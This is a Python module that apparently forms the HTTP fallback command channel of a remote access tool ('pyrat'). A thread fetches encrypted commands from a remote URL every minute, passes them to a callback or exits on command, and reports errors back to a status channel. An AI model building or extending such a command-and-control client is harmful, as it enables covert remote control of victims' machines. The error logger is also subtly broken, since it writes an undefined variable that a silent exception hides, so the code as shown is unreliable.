import os
import threading
import time
from web.CmdRelay import get_channel, set_channel
import json
import traceback

class WebCommandParser(threading.Thread):
    def __init__(self, url, channel, enc_keys, status_channel=None):
        super().__init__()
        self.url = url
        self.channel = channel
        self.enc_keys = enc_keys
        self.status_channel = status_channel
        self._stop_event = threading.Event()
        self.callback = None  # Initialize callback attribute

    def run(self):
        while not self._stop_event.is_set():
            cmd = get_channel(self.url, self.channel, self.enc_keys)
            if cmd is not None:
                print("Executing command: " + cmd)

                try:
                    cmd_json = json.loads(cmd)
                    
                    if cmd_json["cmd"] == "exit":
                        print("Http Fallback: Exiting...")
                        os._exit(0)

                    elif self.callback is not None:
                        self.callback(self.enc_keys, cmd_json)

                except Exception as e:
                    traceback_str = traceback.format_exc()
                    self.logError(traceback_str)

            time.sleep(60)  # Sleep for 1 minute

    def logError(self, error):
        print(error)
        try:
            with open("/var/log/pyrat/error.log", "a") as file:
                file.write(log_line + "\n")
        except:
            pass

        try:
            if self.status_channel is not None:
                set_channel(self.url, self.status_channel, self.enc_keys, -1, 'Error: '+error)
        except:
            pass

    def stop(self):
        self._stop_event.set()

    def set_callback(self, callback):
        self.callback = callback

    def getURL(self):
        return self.url

    def getChannel(self):
        return self.channel
    
    def getStatusChannel(self):
        return self.status_channel
    

